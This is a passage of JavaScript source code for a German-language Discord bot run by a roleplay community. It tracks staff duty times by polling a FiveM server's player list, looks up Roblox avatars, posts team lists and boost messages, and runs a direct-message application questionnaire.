//dieser Code Benötigt discord.js v14.17.3

const chalk = require('chalk');
const fs = require("fs");
const axios = require('axios');


const { DateTime } = require("luxon");
//const { Intents } = require("discord.js");
const { google } = require('googleapis');
const { joinVoiceChannel, createAudioPlayer, createAudioResource, AudioPlayerStatus, getVoiceConnection } = require('@discordjs/voice');
const { Client, Permissions , Intents, GatewayIntentBits , Collection, MessageEmbed, MessageActionRow, MessageButton, MessageSelectMenu, MessageSelectOptionBuilder } = require("discord.js");
const { loadEvents } = require("../src/handlers/loadEvents");
const ffmpegPath = require('ffmpeg-static');
const path = require('path');
const { loadSlashCommands } = require("../src/handlers/loadSlashCommands");
const { startServer } = require("../src/server")
const { botToken, spreadsheetId } = require("../src/jsons/config.json");
const cron = require("node-cron");
const moment = require("moment-timezone");
const { updateRegeln } = require("./events/updateregeln");
const { updateFraktionenList } = require("./events/updatefraktionenlist.js");

const config = require("../src/jsons/config.json");

const memberFile = "./src/SlashCommands/levelsys/members.json"; // Pfad zur JSON-Datei
const activeVoiceFile = "./src/jsons/activeVoiceTimes.json"; // Datei für aktive Voice-Zeiten
const ignoreRoleId = ["1320012130774417450", "1355989083196752073"]; // Rolle, die ignoriert werden soll

const { sendToChatGPT } = require(path.join(__dirname, "./events/chatgpt.js"));

// Declaring our Discord Client
const client = new Client({
	allowedMentions: { parse: ["users", "roles"] },
	intents: [
	  Intents.FLAGS.GUILDS,
	  Intents.FLAGS.GUILD_MESSAGES,
	  Intents.FLAGS.GUILD_MEMBERS,
	  Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
	  Intents.FLAGS.GUILD_WEBHOOKS,
	  Intents.FLAGS.GUILD_VOICE_STATES,
	  Intents.FLAGS.GUILD_INVITES,
	  Intents.FLAGS.GUILD_BANS,
	  Intents.FLAGS.GUILD_PRESENCES,
	  Intents.FLAGS.DIRECT_MESSAGES,
      

	],
    partials: ['CHANNEL'], // Erforderlich für DMs
});

const TARGET_USER_ID = '816719885400539156'; // Discord User
const ROLE_ACCEPT = "1357672782359429360"; // Aufnahme erlaubt
const ROLE_DENY = "1357672833727336530";   // Aufnahme verboten

// Event-Listener für Käufe
global.bot = client; // Mach den Bot global verfügbar
client.on('purchase', async ({ productName, userId }) => {
    console.log('Event ausgelöst:', productName, userId); // Debug-Ausgabe
    try {
        const user = await client.users.fetch(TARGET_USER_ID);
        await user.send(`Neuer Kauf von User ${userId}: ${productName}`);
        console.log(`Nachricht gesendet: ${productName}`);
    } catch (error) {
        console.error('Fehler beim Senden der Nachricht:', error);
    }
});

// Google Sheets Authorisation Stuff
const auth = new google.auth.GoogleAuth({
	keyFile: "src/jsons/credentials.json",
	scopes: "https://www.googleapis.com/auth/spreadsheets"
});
const sheetClient = auth.getClient();
const googleSheets = google.sheets({ version: "v4", auth: sheetClient });

//client.sheetCommands = fs.readdirSync("./src/SlashCommands/Sheets/");
//client.slash = new Collection();
client.auth = auth;
client.sheetId = spreadsheetId;
client.googleSheets = googleSheets.spreadsheets;

loadEvents(client);
loadSlashCommands(client);
require("./deploy-commands.js");

const activeVoiceTimes = {}; // Temporäre Struktur zum Speichern der Eintrittszeiten

// Funktion zum Berechnen des reduzierten Zuwachses
function calculateIncrement(count, baseIncrement = 0.5, minIncrement = 0.01) {
    const level = Math.floor(count); // Ganze Zahl des Counts
    const increment = baseIncrement / (1 + level); // Zuwachs reduziert sich mit steigendem Level
    return Math.max(increment, minIncrement); // Minimalwert sicherstellen
}

// Funktion zum Abrufen der Voice-Channel-Kategorie
function getVoiceChannelCategory(member) {
    return member.voice?.channel?.parentId || null;
}

async function getRobloxUserId(username) {
    try {
        // Hole die User-ID über die Roblox API
        const userResponse = await fetch(`https://users.roblox.com/v1/usernames/users`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
        });

        const userData = await userResponse.json();

        if (!userData.data || userData.data.length === 0) {
            throw new Error(`❌ Benutzer '${username}' nicht gefunden.`);
        }

        const userId = userData.data[0].id;

        if (!userId) {
            throw new Error(`❌ Benutzer '${username}' nicht gefunden.`);
        }

        return userId;
    } catch (error) {
        console.error(`❌ Fehler beim Abrufen der User-ID: ${error.message}`);
        return null;
    }
}

// Hauptfunktion zum Exportieren der Mitglieder mit einer bestimmten Rolle
async function exportMembersWithRole(guild) {
    const fivemServerUrl = 'http://63.180.0.44:30120/players.json';

    const response = await axios.get(fivemServerUrl);
    const players = response.data;

    const formattedPlayers = players.map(player => ({
        id: player.id,
        name: player.name,
        identifiers: player.identifiers,
        ping: player.ping
    }));
    
    try {
        const roleId = "1332238674657808447";
        const outputFile = path.join(__dirname, `./jsons/${guild.id}/teamler.json`);
        const role = guild.roles.cache.get(roleId);

        if (!role) {
            console.error(`❌ Rolle mit der ID ${roleId} wurde nicht gefunden.`);
            return;
        }

        //console.log(`✅ Mitglieder mit der Rolle "${role.name}" werden exportiert...`);

        // Bestehende Datei einlesen
        let existingData = [];
        if (fs.existsSync(outputFile)) {
            existingData = JSON.parse(fs.readFileSync(outputFile, 'utf8'));
        }

        // Duty-Status bestimmen
        let membersWithRole = [];

        const roleMap0 = {
            "1134164679283965962": "Owner",
            "1319999229015494746": "Co-Owner",
            "1319999181254823936": "Admin",
            "1321208637460582460": "Moderator"
        };

        const roleMap = {
            "1134164679283965962": "Owner",
            "1319999229015494746": "Co-Owner",
            "1319999181254823936": "Admins",
            "1321208637460582460": "Moderatoren"
        };

        const roleGroups = {
            Owner: [],
            "Co-Owner": [],
            Admins: [],
            Moderatoren: []
        };

        for (const memb of role.members.values()) {
            const person = existingData.find(user => user.id === memb.id);
            let getduty = false;
            const user = await guild.members.fetch(memb.id);

            if (formattedPlayers.find(p => p.name === user.displayName.split("| ")[1])) {
                //const category = getVoiceChannelCategory(memb);
                getduty = true;
            }

            const getrobloxlist = JSON.parse(fs.readFileSync(__dirname + "/jsons/verified.json", "utf8"));
            

            const robloxname = getrobloxlist[memb.id] ? getrobloxlist[memb.id] : null;

            //if (!robloxname) {
                //console.log(`Kein Roblox-Eintrag für: ${memb.id} (${memb.user.username})`);
                //continue;
            //}

            const robloxnameslit = robloxname ? robloxname.split(" (")[1].split(")")[0] : null;

            const disname = robloxname ? robloxname.split(" (")[0] : null;

            let robloxID = null;
            if (robloxnameslit != null) {
                robloxID = await getRobloxUserId(robloxnameslit);
            }
            
            

            let updatedDutyTimes = person?.dutytimes || [];
            const currentTime = DateTime.now().setZone("Europe/Berlin").toFormat("dd.MM.yyyy HH:mm:ss");

            //console.log(`${memb.user.username} ist auf dem Server: ${getduty} und ${formattedPlayers.find(p => p.name === user.displayName.split("| ")[1]) ? "🟢 auf dem Server" : "🔴 Nicht auf dem Server"}`)

            // Spieler ist auf dem Server
            if (getduty) {
                const lastSession = updatedDutyTimes[updatedDutyTimes.length - 1];
                if (!lastSession || lastSession.end) {
                    updatedDutyTimes.push({
                        start: currentTime,
                        end: null
                    });
                }
            } else {
                // Spieler ist NICHT mehr auf dem Server
                const lastSession = updatedDutyTimes[updatedDutyTimes.length - 1];
                if (lastSession && !lastSession.end) {
                    lastSession.end = currentTime;
                }
            }

            // → dann push in die Ausgabe:
            for (const [roleId, roleName] of Object.entries(roleMap0)) {
                
                if (user.roles.cache.has(roleId)) {
                
            
                    membersWithRole.push({
                        id: memb.id,
                        username: memb.user.username,
                        roleName: roleName,
                        roleId: roleId,
                        robloxname: disname || memb.user.username.split(" | ")[1],
                        robloxUserId: robloxID || null,
                        robloxAvatarUrl: robloxID == null
                            ? "https://preview.redd.it/they-updated-the-content-deleted-icon-for-for-roblox-avatars-v0-9t833zvmhgzd1.png?width=250&format=png&auto=webp&s=2f7711065f8e9a783fb0da9defdf9252134ece33"
                            : await getRobloxAvatarUrl(robloxID),
                        discriminator: memb.user.discriminator,
                        nickname: memb.nickname || null,
                        onduty: getduty,
                        dutytimes: updatedDutyTimes
                    });
                    break;
                }
            }            
        }

        

        //console.log(`📋 Anzahl der Mitglieder mit der Rolle "${role.name}": ${membersWithRole.length}`);

        // Speichern in JSON-Datei
        fs.writeFileSync(outputFile, JSON.stringify(membersWithRole, null, 4), "utf8");

        // Nachricht für Duty-Status
        const dutychannel = guild.channels.cache.get("1354107281184133130");
        if (!dutychannel) {
            console.error("❌ Kanal für Duty-Nachrichten nicht gefunden.");
            return;
        }

        const teamlistch = guild.channels.cache.get("1354094537856909335");
        if (!teamlistch) {
            console.error("❌ Kanal für Teamlisten-Nachrichten nicht gefunden.");
            return;
        }

        // Teamliste erstellen
        const teamlistEmbed = new MessageEmbed()
            .setColor("#590860")
            .setTitle("📋 Teamliste 📋")
            .setDescription(`Diese Liste enthält alle Mitglieder des <@&1332238674657808447>.`)
            .setFooter("StarRP Teamliste")
            .setThumbnail("https://i.imgur.com/0tRDkjZ.png")
            .setTimestamp()
            .setImage(`https://i.imgur.com/CnwwYET.png`);


        for (const teamler of membersWithRole) {
            const user = await guild.members.fetch(teamler.id);
            for (const [roleId, roleName] of Object.entries(roleMap)) {
                if (user.roles.cache.has(roleId)) {
                    roleGroups[roleName].push(`<@${teamler.id}> - ${formattedPlayers.find(p => p.name === user.displayName.split("| ")[1]) ? "🟢 auf dem Server" : "🔴 Nicht auf dem Server"}`);
                    break;
                }
            }
        }

        for (const [roleName, members] of Object.entries(roleGroups)) {
            teamlistEmbed.addField(`**${roleName}**`, members.length > 0 ? members.join("\n\n") : `❌ Kein ${roleName}`, false);
        }

        // Teamliste aktualisieren oder senden
        const listMessages = await teamlistch.messages.fetch({ limit: 10 });
        const listMessage = listMessages.find(msg => msg.author.id === client.user.id && msg.embeds[0]?.title === "📋 Teamliste 📋");

        if (listMessage) {
            await listMessage.edit({ content: "<@&1355508021262024714> hier findet ihr das <@&1332238674657808447>", embeds: [teamlistEmbed] });
        } else {
            await teamlistch.send({ content: "<@&1355508021262024714> hier findet ihr das <@&1332238674657808447>", embeds: [teamlistEmbed] });
        }

        // Duty-Button-Nachricht
        const dutyEmbed = new MessageEmbed()
            .setColor("#590860")
            .setTitle("🚀 **In Dienst gehen!** 🚀")
            .setDescription("Bitte gehe nur in Dienst, wenn du **wirklich** auf dem Server bist.")
            .setImage(`https://i.imgur.com/CnwwYET.png`);

        const dutyButton = new MessageActionRow().addComponents(
            new MessageButton()
                .setCustomId(`duty`)
                .setLabel('Dienst gehen/verlassen')
                .setStyle('SUCCESS')
        );

        // Duty-Nachricht aktualisieren oder senden
        const dutyMessages = await dutychannel.messages.fetch({ limit: 10 });
        const dutyMessage = dutyMessages.find(msg => msg.author.id === client.user.id && msg.embeds[0]?.title === "🚀 **In Dienst gehen!** 🚀");

        if (dutyMessage) {
            await dutyMessage.edit({ content: "<@&1332238674657808447> Hier könnt ihr in Dienst und aus dem Dienst gehen", embeds: [dutyEmbed], components: [dutyButton] });
        } else {
            await dutychannel.send({ content: "<@&1332238674657808447> Hier könnt ihr in Dienst und aus dem Dienst gehen", embeds: [dutyEmbed], components: [dutyButton] });
        }

    } catch (error) {
        console.error("❌ Fehler beim Exportieren der Mitglieder:", error);
    }
}

async function getRobloxAvatarUrl(robloxID) {
    const response = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${robloxID}&size=150x150&format=Png&isCircular=false`);
    const data = await response.json();
  
    if (data.data && data.data.length > 0) {
      return data.data[0].imageUrl;
    } else {
      throw new Error(`Avatar von ${robloxID} nicht gefunden`);
    }
}

function shouldIgnoreUser(member) {
    if (!member || !member.roles || !member.roles.cache) return false;

    return ignoreRoleId.some(roleId => member.roles.cache.has(roleId));
}



// Event-Handler für das Server-Boost-Ereignis
client.on('guildMemberUpdate', async (oldMember, newMember) => {
    try {
        // Prüfen, ob der Benutzer den Server boosted
        if (!oldMember.premiumSince && newMember.premiumSince) {
            console.log(`${newMember.user.tag} hat den Server geboostet! 🎉`);
            
            // Kanal, in dem die Nachricht gesendet wird (ersetzen Sie CHANNEL_ID durch die ID Ihres Kanals)
            const boostChannel = newMember.guild.channels.cache.get('1326970517646868623');
            if (!boostChannel) {
                console.error("Boost-Channel nicht gefunden.");
                return;
            }

            const boostembed = new MessageEmbed()
                .setTitle("💎 **Server-Boost erhalten!** 💎")
                .setDescription(`Vielen Dank, dass du **${newMember.guild.name}** unterstützt! Dein Boost bedeutet uns sehr viel!`)
                .setColor("#590860");
                //.setImage('https://i.imgur.com/CnwwYET.png' );

                

            // Nachricht an den Boost-Kanal senden
            boostChannel.send({
                content: `Vielen Dank <@${newMember.id}> fürs Boosten des Servers! 🎉✨`,
                embeds: [boostembed]
            });

            // Optional: Rolle für Booster zuweisen (ersetzen Sie ROLE_ID durch die ID der Booster-Rolle)
            const boosterRole = newMember.guild.roles.cache.get('1332474020112896001');
            if (boosterRole) {
                await newMember.roles.add(boosterRole);
                console.log(`${newMember.user.tag} wurde die Booster-Rolle hinzugefügt.`);
            } else {
                console.warn("Booster-Rolle nicht gefunden.");
            }
        }
    } catch (error) {
        console.error("Fehler beim Server-Boost-Ereignis:", error);
    }
});


// Funktion zum Aktualisieren des Count-Wertes
function updateMemberCount(userId, increment, guild) {
	try {
		const member = guild.members.cache.get(userId);
		if (shouldIgnoreUser(member)) {
			console.log(chalk.yellow(`Benutzer ${member.user.tag} wird ignoriert (hat die Rolle ${ignoreRoleId}).`));
            if (member.roles.cache.has("1320012130774417450")) {
                removeBotFromList(member.user.id); // Bot sofort entfernen
            }
			return; // Benutzer ignorieren
		}

        const membersFile = `./src/jsons/${guild.id}/members.json`; // Pfad zur JSON-Datei


		const data = JSON.parse(fs.readFileSync(membersFile));
		if (data[userId]) {
			const currentCount = data[userId].count || 0.0;
			data[userId].count = currentCount + increment;
			data[userId].avatar = member.user.avatar || null;
			const pending = data[userId].pending || 0.0

			fs.writeFileSync(membersFile, JSON.stringify(data, null, 4));
			memberlist(member);
			console.log(
				chalk.greenBright(
					`Count für Benutzer ${userId} aktualisiert: ${data[userId].count} (Zuwachs: ${increment.toFixed(3)})`
				)
			);
		} else {
			console.log(chalk.red(`Benutzer ${userId} nicht in der JSON gefunden.`));
		}
	} catch (error) {
		console.error(chalk.red("Fehler beim Aktualisieren des Count-Wertes:"), error);
	}
}

//#region bewerbung

const applicationDataPath = path.join(__dirname, 'jsons/bewerbung.json');
const applicationPanelPath = path.join(__dirname, 'jsons/bewerbungspanel.json');
let applications = {};
let applicationPanel = {};
let ongoingApplications = {}; // Benutzer-IDs mit laufenden Bewerbungen
let panelSent = true;
const applicationsavePath = path.join(__dirname, 'jsons/bewerbungenlog.json');

// Hilfsfunktion: Bewerbungen speichern
function saveApplicationToFile(application) {
    let applications = [];
    if (fs.existsSync(applicationsavePath)) {
        applications = JSON.parse(fs.readFileSync(applicationsavePath, 'utf8'));
    }
    applications.push(application);
    fs.writeFileSync(applicationsavePath, JSON.stringify(applications, null, 2));
}

// Hilfsfunktion: Bewerbung aktualisieren
function updateApplicationStatus(userId, status) {
    if (!fs.existsSync(applicationsavePath)) return;
    const applications = JSON.parse(fs.readFileSync(applicationsavePath, 'utf8'));
    const application = applications.find((app) => app.userId === userId);
    if (application) {
        application.status = status;
        fs.writeFileSync(applicationsavePath, JSON.stringify(applications, null, 2));
    }
}

const applicationPath = path.join(__dirname, "jsons/bewerbung.json");

async function sendpanel() {

    // **1️⃣ Lade Panel- & Bewerbungs-Daten**
    let panelData = JSON.parse(fs.readFileSync(applicationPanelPath, "utf8"));
    let applicationData = JSON.parse(fs.readFileSync(applicationPath, "utf8"));

    // **2️⃣ Gehe durch jedes Panel (Bewerbungen, Fraktionen, etc.)**
    for (const [panelKey, panel] of Object.entries(panelData)) {

        // **3️⃣ Versuche, den Channel zu holen (Force-Fetch, falls nicht gecacht)**
        let channel;
        try {
            channel = await client.channels.fetch(panel.channel);
        } catch (error) {
            console.error(`❌ Fehler: Panel-Channel (${panelKey}) konnte nicht gefunden werden.`, error);
            continue; // Fahre mit dem nächsten Panel fort
        }

        if (!channel) {
            console.error(`❌ Fehler: Panel-Channel (${panelKey}) existiert nicht.`, error);
            continue;
        }

        // **4️⃣ Erstelle das Panel-Embed**
        const embed = new MessageEmbed()
            .setTitle(panel.label)
            .setDescription(panel.description)
            .setColor("#590860")
            .setFooter(panel.footer)
            //.setImage('https://i.imgur.com/CnwwYET.png' );


        // **5️⃣ Dropdown-Menü für Bewerbungen generieren**
        const selectMenu = new MessageSelectMenu()
            .setCustomId(`application_select_${panelKey}`)
            .setPlaceholder("Wähle eine Option aus...")
            .addOptions(
                panel.options.map((optionKey) => {
                    const application = applicationData[optionKey]; // Bewerbungsdaten holen
                    return {
                        label: application ? application.label : optionKey,
                        description: application ? application.description : "Keine Beschreibung verfügbar",
                        value: optionKey.toLowerCase(),
                    };
                })
            );

        const row = new MessageActionRow().addComponents(selectMenu);

        let sentMessage;

        // **6️⃣ Überprüfe, ob eine Panel-Nachricht existiert**
        if (panel.panelmessage) {
            try {
                const existingMessage = await channel.messages.fetch(panel.panelmessage);
                await existingMessage.edit({ embeds: [embed], components: [row] });
                sentMessage = existingMessage;
            } catch (error) {
                console.error(`⚠️ Panel-Message nicht gefunden oder aktualisierbar. Sende neue Nachricht...`, error);
                sentMessage = await channel.send({ embeds: [embed], components: [row] });
            }
        } else {
            // **7️⃣ Falls keine Nachricht existiert, sende neues Panel**
            sentMessage = await channel.send({ embeds: [embed], components: [row] });
        }

        // **8️⃣ Speichere aktualisierte Panel-ID**
        panel.panelmessage = sentMessage.id;
    }

    // **9️⃣ Speichere die aktualisierten panelmessage-IDs in der JSON-Datei**
    fs.writeFileSync(applicationPanelPath, JSON.stringify(panelData, null, 2));
}

function deleteApplication(userId, type) {
    console.log(`🟢 deleteApplication wurde mit userId: ${userId}, type: ${type} aufgerufen.`);

    const applications = JSON.parse(fs.readFileSync(applicationsavePath, 'utf-8'));

    const updatedApplications = applications.filter(app => {
        console.log(`Vergleich: ${app.userId} === ${userId} && ${app.application} === ${type}`);
        return !(app.userId === userId && app.application === type);
    });

    try {
        fs.writeFileSync(applicationsavePath, JSON.stringify(updatedApplications, null, 2));
        console.log(`✅ Bewerbung vom Typ "${type}" für Benutzer ${userId} wurde gelöscht.`);
    } catch (error) {
        console.error("❌ Fehler beim Speichern der Datei:", error);
    }
}



function hasApplication(type, userId) {
    const applicationsPath = path.join(__dirname, './jsons/bewerbungenlog.json');

    if (!fs.existsSync(applicationsPath)) return false;

    const applications = JSON.parse(fs.readFileSync(applicationsPath, 'utf8'));

    // Ausgabe nur der Namen im Log
    const names = applications.map(app => app.application || "Unbekannter Name");
    const userids = applications.map(app => app.userId || "Unbekannter User");
    console.log(`🔍 Bewerbungen für ${type}: ${names.join(', ')} und die userers ${userids.join(', ')} suchte nach user mit id ${userId}`);

    return applications.some(app =>
        app.userId === userId &&
        app.application === type
    );
}




client.on("interactionCreate", async (interaction) => {
    if (!interaction.isSelectMenu()) return;

    console.log(`🔍 Debug: Erhaltene Auswahl - customId: ${interaction.customId}`);
    

    // 📌 Unterscheide zwischen Bewerbungs-Panel und Frage-Auswahl
    if (interaction.customId.startsWith("question_")) {
        console.log("📌 Dies ist eine Bewerbungsfrage.");
        //handleQuestionInteraction(interaction);
        require("./events/questitionhandler.js");
        return;
    }

    // 📌 Extrahiere den Panel-Key aus der Custom-ID
    const panelKey = interaction.customId.replace("application_select_", "").toLowerCase();
    console.log(`🔍 Debug: Erkannter Panel-Key: ${panelKey}`);

    // 📌 Lade die Panel-Daten
    const panelData = JSON.parse(fs.readFileSync(applicationPanelPath, "utf8"));

    // 📌 Prüfe, ob das Panel existiert
    if (!panelData[panelKey]) {
        sendpanel();
        return interaction.reply({
            content: `❌ Fehler: Dieses Bewerbungs-Panel **(${panelKey})** existiert nicht.`,
            ephemeral: true,
        });
    }

    console.log(`✅ Panel gefunden: ${panelData[panelKey].label}`);

    const userId = interaction.user.id;

    // 📌 Prüfe Blacklist
    if (panelData[panelKey].blacklist.includes(userId)) {
        sendpanel();
        return interaction.reply({ content: "🚫 Du bist auf der Blacklist und kannst dich nicht bewerben.", ephemeral: true });
    }

    // 📌 Prüfe `deny_roles`
    if (panelData[panelKey].deny_roles.some(role => interaction.member.roles.cache.has(role))) {
        sendpanel();
        return interaction.reply({ content: "⚠️ Du hast eine Rolle, die dich von Bewerbungen ausschließt.", ephemeral: true });
    }

    // 📌 Prüfe, ob der Benutzer bereits eine laufende Bewerbung hat
    if (ongoingApplications[userId]) {
        sendpanel();
        return interaction.reply({
            content: `⚠️ Du hast bereits eine laufende Bewerbung: **${ongoingApplications[userId]}**. Bitte beende diese zuerst.`,
            ephemeral: true,
        });
    }

    const selectedRole = interaction.values[0].replace(" ", "_").toLowerCase();
    const selectedApplication = applications[selectedRole];

    if (!selectedApplication) {
        sendpanel();
        return interaction.reply({ content: "❌ Die gewählte Bewerbung ist nicht verfügbar.", ephemeral: true });
    }

    const logChannel = client.channels.cache.get(selectedApplication.log_channel);
    if (!logChannel) {
        sendpanel();
        return interaction.reply({ content: "❌ Der Log-Channel für diese Bewerbung wurde nicht gefunden.", ephemeral: true });
    }

    // ✅ Interaktion wird bestätigt, um Fehler zu vermeiden
    await interaction.deferUpdate();

    const AN = selectedApplication.label.replace(" ", "_").toLowerCase();

    if(hasApplication(selectedApplication.label, userId))
    {
        sendpanel();
        console.log("eingereichte bewerbung");
        return interaction.followUp({ content: "Du hast bereis eine Bewerbung eingereicht bitte warte bis diese beantwortet wurde", ephemeral: true });
    }

    console.log("keine bewerbung eingereicht");

    // ✅ Starte Bewerbung
    ongoingApplications[userId] = selectedApplication.label;

    let mes;

    try {
        mes = await interaction.user.send("📢 Willkommen zur Bewerbung! Ich stelle dir nun einige Fragen.");
    } catch (error) {
        console.error("⚠️ Fehler beim Senden der DM:", error);
        return interaction.followUp({
            content: "⚠️ Ich konnte dir keine Direktnachricht senden. Bitte überprüfe deine Einstellungen.",
            ephemeral: true,
        });
    }


    await interaction.followUp({
        content: "📩 Die Fragen werden dir per Direktnachricht gesendet.",
        ephemeral: true,
        components: [
            new MessageActionRow().addComponents(
                new MessageButton()
                    .setLabel('📨 Hier')
                    .setStyle('LINK') // LINK-Style für externe Links
                    .setURL(`https://discord.com/channels/@me/${mes.channelId}`)
            )
        ]
    });
    sendpanel();

    

    // ❓ Frage/Antwort Prozess
    const questions = selectedApplication.questions;
    let counter = 0;
    const answers = [];

    const messages = [];

    const askQuestion = async () => {
        if (counter < questions.length) {
            const CQ = questions[counter];
            const currentQuestion = CQ.question;
            const optionMatch = currentQuestion.match(/\[(.*?)\]/);
    
            if (optionMatch) {
                // Dropdown-Frage
                const options = optionMatch[1].split('/').map(option => option.trim());
    
                const selectMenu = new MessageSelectMenu()
                    .setCustomId(`question_${counter}`)
                    .setPlaceholder("Wähle eine Option aus...")
                    .addOptions(
                        options.map(option => ({ label: option, value: option }))
                    );
    
                const row = new MessageActionRow().addComponents(selectMenu);
    
                const questionEmbed = new MessageEmbed()
                    .setTitle(`Frage ${counter + 1}`)
                    .setDescription(currentQuestion.replace(/\[.*?\]/, ""), `\n\n**Bitte wähle eine Option aus dem Dropdown-Menü.**`)
                    .setColor("#00ff00")
                    .setFooter("Bitte wähle eine Option aus dem Dropdown-Menü.");
    
                const questionMessage = await interaction.user.send({ embeds: [questionEmbed], components: [row] });

                await messages.push(questionMessage);
    
                const collector = questionMessage.createMessageComponentCollector({
                    componentType: "SELECT_MENU",
                    filter: (i) => i.user.id === interaction.user.id,
                    time: 300000 // 5 Minuten
                });
    
                collector.on("collect", async (selectInteraction) => {
                    await selectInteraction.deferUpdate();
    
                    const selectedOption = selectInteraction.values[0];
                    answers.push(selectedOption);

                    questionMessage.edit(
                        {components:[]}
                    );

                    // **❓ Prüfen, ob es eine Folgefrage gibt**
                    if (CQ.follow_up && CQ.follow_up[selectedOption]) {
                        console.log(`🔍 Folgefrage gefunden für Antwort: ${selectedOption}`);

                        // **🚀 Folgefrage wird hinzugefügt**
                        questions.splice(counter + 1, 0, {
                            question: CQ.follow_up[selectedOption]
                        });
                    }
    
                    counter++;
                    if (counter >= questions.length) {
                        //await finishApplication();
                        console.log(`Bewerbung abgeschlossen 455`);
                    } else {
                        await askQuestion();
                        console.log(`Frage ${currentQuestion} gestellt 457 ${interaction.user.id}`);
                    }
                });
    
                collector.on("end", (_, reason) => {
                    if (reason === "time") {
                        //interaction.user.send("⚠️ Du hast zu lange gebraucht, um eine Auswahl zu treffen.");
                        delete ongoingApplications[userId];
                    }
                });
    
            } else {
                // Textfrage
                const questionEmbed = new MessageEmbed()
                    .setTitle(`Frage ${counter + 1}`)
                    .setDescription(currentQuestion)
                    .setColor("#00ff00")
                    .setFooter("Bitte antworte auf diese Nachricht.");

                const row = new MessageActionRow().addComponents(
                    new MessageButton()
                        .setCustomId(`stoppen_bewerbung`)
                        .setLabel('Abbrechen')
                        .setStyle('DANGER'),
                    )
    
                const message = await interaction.user.send({ embeds: [questionEmbed], components: [row] });

                messages.push(message);
    
                const textCollector = interaction.user.dmChannel.createMessageCollector({
                    filter: (m) => m.author.id === interaction.user.id,
                    time: 300000
                });
    
                textCollector.on("collect", async (response) => {
                    //if (response.content.trim() === "" && response.attachments.size < 1) {
                        //await interaction.user.send("Bitte gib eine gültige Antwort ein.");
                        //return;
                    //}


                    textCollector.stop();
                    counter++;

                    if (response.attachments.size > 0) {
                        response.attachments.forEach(attachment => {
                            answers.push(`📎 Datei: ${attachment.url}`);
                        });
                    } else if (response.content) {
                        answers.push(response.content);
                    } else {
                        answers.push("🎤 Sprachnachricht erhalten.");
                    }

                    console.log(`Antwort: ${response.content} von ${userId}`);
                
                    if (counter >= questions.length) {

                        await processbewerbung(questions, answers, userId, interaction)
                        
                        if (await getage(questions, answers) < 14) {
                            const user = await client.users.fetch(userId);
                            const answerText = answers.map((answer, i) => {
                                const questionText = questions[i] || `Frage ${i + 1} (keine Frage verfügbar)`; // Fallback-Text
                                return `**Frage ${i + 1}:** ${questionText}\n**Antwort:** ${answer}`;
                            }).join('\n\n');

                            
                
                            const guildMember = await client.guilds.cache.first().members.fetch(userId);
                            const endEmbed = new MessageEmbed()
                                .setTitle(`${selectedApplication.label}`)
                
                                .setDescription(
                                    `Deine \`${selectedApplication.label} Bewerbung\` wurde abgelehnt mit dem Grund: \`\`\`Zu jung um ${selectedApplication.label} zu werden musst du mindestens 14 Jahre alt sein\`\`\``)
                                .setColor('#00ff00')
            
                            
                            const declineLogEmbed = new MessageEmbed()
                                .setTitle(`Neue Bewerbung für \`${selectedApplication.label}\` von ${user.tag}`)
                                .setThumbnail(user.displayAvatarURL({ dynamic: true }))
                                .setDescription(answers.map((answer, i) => `Frage ${i + 1}: ${questions[i].question}\n**Antwort:** ${answer}`).join("\n\n"))
                                .addField('**Bewerbungs stats**\n', `**UserId:** \`${userId}\`\n**Username:** \`${user.username}\`\n**User:** <@${userId}>\n**Joined at:** <t:${Math.floor(interaction.member.joinedTimestamp / 1000)}:F>`)
                                .setColor('#ff0000');
                
                
                            guildMember.send({embeds: [endEmbed]});
            
                            deleteApplication(user.id, selectedApplication.label);
            
                            return logChannel.send({
                                content: `<@1321066724237508650> hat die \`${selectedApplication.label} Bewerbung\` von <@${userId}> abgelehnt.\n\n**Grund:**\n\`\`\`Zu jung um ${selectedApplication.label} zu werden musst du mindestens 14 Jahre alt sein\`\`\``,
                                embeds: [declineLogEmbed],
                                components: [],
                            });
                        }

                        await finishApplication();

                        messages.forEach(async msg => {
                            await msg.edit(
                                { components: [] }
                            );
                        });

                        await questionMessage.edit({ components: [] });

                        console.log("Bewerbung abgeschlossen 496");
                    } else {
                        await askQuestion();
                        message.edit(
                            { components: [] }
                        );
                        console.log(`Frage ${currentQuestion} gestellt 497 ${interaction.user.id}`);
                    }
                });

                // ✅ Button Collector erstellen (60 Sekunden Laufzeit)
                const collector = message.createMessageComponentCollector({ 
                    filter: (i) => i.customId === "stoppen_bewerbung" && i.user.id === interaction.user.id,
                    time: 300000
                });

                // 🟢 Falls der Benutzer den Button drückt
                collector.on("collect", async (btnInteraction) => {
                    textCollector.stop();
                    collector.stop();
                    delete ongoingApplications[userId];
                    messages.forEach(msg => {
                        const abbruch = new MessageEmbed(msg.embeds[0])
                            .setColor('#FF0000')
                        msg.edit(

                            { embeds: [abbruch], components: [] }
                        );
                    });
                    message.edit(
                        { components: [] }
                    );
                    await btnInteraction.reply({ content: "Bewerbung wurde erfolgreich beendet", ephemeral: true });
                });
    
                textCollector.on("end", (_, reason) => {
                    if (reason === "time") {
                        interaction.user.send("⚠️ Du hast zu lange gebraucht, um eine Antwort zu geben.");
                        delete ongoingApplications[userId];
                    }
                });
            }
        }
    };
    
    const finishApplication = async () => {
        delete ongoingApplications[userId];

        const embed = new MessageEmbed()
            .setTitle(`✅ Deine Bewerbung für **${selectedApplication.label}** wurde erfolgreich eingereicht.`)
            .setDescription(answers.map((answer, i) => `**Frage ${i + 1}:** ${questions[i].question}\n**Antwort:** ${answer}`).join("\n\n"))
            .setColor("#00ff00");
    
        await interaction.user.send({ embeds: [embed] });
    
        const logEmbed = new MessageEmbed()
            .setTitle(`📝 Neue Bewerbung für ${selectedApplication.label}`)
            .setThumbnail(interaction.user.displayAvatarURL({ dynamic: true }))
            .setDescription(
                answers.map((answer, i) => `**Frage ${i + 1}:** ${questions[i].question}\n**Antwort:** ${answer}`).join("\n\n")
            )
            .addField('**Bewerbungs stats**\n', `**UserId:** \`${userId}\`\n**Username:** \`${interaction.user.username}\`\n**User:** <@${userId}>\n**Joined at:** <t:${Math.floor(interaction.member.joinedTimestamp / 1000)}:F>`)
            .setColor("#0000ff");

        let antwort = "";
        
        if (selectedApplication.label !== "Fraktion bilden") {
            
            //antwort = await sendToChatGPT(logEmbed.description);
        }
        
        const row = new MessageActionRow().addComponents(
            new MessageButton()
